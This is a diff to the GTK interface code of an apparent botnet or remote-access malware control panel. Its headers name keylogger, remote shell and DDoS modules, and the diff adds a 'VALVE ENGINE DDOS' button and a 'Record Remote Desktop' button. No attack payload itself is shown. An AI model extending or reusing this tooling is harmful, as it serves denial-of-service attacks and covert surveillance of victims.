@@ -19,7 +19,7 @@
 #include "../includes/callbacks_keyloggers.h"
 #include "../includes/callbacks_remote_shell.h"
 #include "../includes/callbacks_ddos.h"
-#include "../includes/callbacks_rudy_ddos.h"
+#include "../includes/callbacks_rudy_arme_ddos.h"
 #include "../includes/callbacks_execute_commands.h"
 
 
@@ -105,6 +105,7 @@ void fill_window(char *argv[])
     GtkWidget *run_udp_script_1 = NULL;
     GtkWidget *run_udp_script_2 = NULL;
     GtkWidget *run_udp_lag_script = NULL;
+    GtkWidget *valve_source_engine_ddos = NULL;
 
     GtkWidget *ssyn_send_script = NULL;
     GtkWidget *essyn_send_script = NULL;
@@ -132,6 +133,7 @@ void fill_window(char *argv[])
 
     /** Execute Commands Vars **/
     GtkWidget *remote_desktop = NULL;
+    GtkWidget *record_desktop = NULL;
 
 
 
@@ -416,7 +418,7 @@ computer across a computer network.\"", -1);
     gtk_frame_set_label_align(GTK_FRAME(frame[3]), (gfloat)0.05, (gfloat)0.5);
     gtk_frame_set_shadow_type(GTK_FRAME(frame[3]), GTK_SHADOW_OUT);
 
-    gtk_widget_set_usize(frame[3], 230, 200);
+    gtk_widget_set_usize(frame[3], 230, 250);
     gtk_fixed_put(GTK_FIXED(zone[2]), frame[3], 100, 10);
 
     run_udp_script_1 = gtk_button_new_with_label("UDP BASIC 1 DDOS");
@@ -433,6 +435,11 @@ computer across a computer network.\"", -1);
     gtk_widget_set_size_request(run_udp_lag_script, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[2]), run_udp_lag_script, 115, 150);
     g_signal_connect(G_OBJECT(run_udp_lag_script), "clicked", G_CALLBACK(cb_udp_power_ddos), NULL);
+
+    valve_source_engine_ddos = gtk_button_new_with_label("VALVE ENGINE DDOS");
+    gtk_widget_set_size_request(valve_source_engine_ddos, 200, 30);
+    gtk_fixed_put(GTK_FIXED(zone[2]), valve_source_engine_ddos, 115, 200);
+    g_signal_connect(G_OBJECT(valve_source_engine_ddos), "clicked", G_CALLBACK(cb_valve_engine_ddos), NULL);
 
     frame[4] = gtk_frame_new(NULL);
     gtk_frame_set_label(GTK_FRAME(frame[4]), "- Specific Attacks - ");
@@ -529,10 +536,15 @@ computer across a computer network.\"", -1);
     gtk_widget_set_usize(frame[30], 430, 580);
     gtk_fixed_put(GTK_FIXED(zone[0]), frame[30], 820, 10);
 
-    remote_desktop = gtk_button_new_with_label("Watch Remote Desktop");
+    remote_desktop = gtk_button_new_with_label("Stream Remote Desktop");
     gtk_widget_set_size_request(remote_desktop, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[0]), remote_desktop, 850, 50);
     g_signal_connect(G_OBJECT(remote_desktop), "clicked", G_CALLBACK(cb_watch_remote_desktop), NULL);
+
+    record_desktop = gtk_button_new_with_label("Record Remote Desktop");
+    gtk_widget_set_size_request(record_desktop, 200, 30);
+    gtk_fixed_put(GTK_FIXED(zone[0]), record_desktop, 850, 100);
+    //g_signal_connect(G_OBJECT(record_desktop), "clicked", G_CALLBACK(cb_watch_remote_desktop), NULL);
 
     **/
 
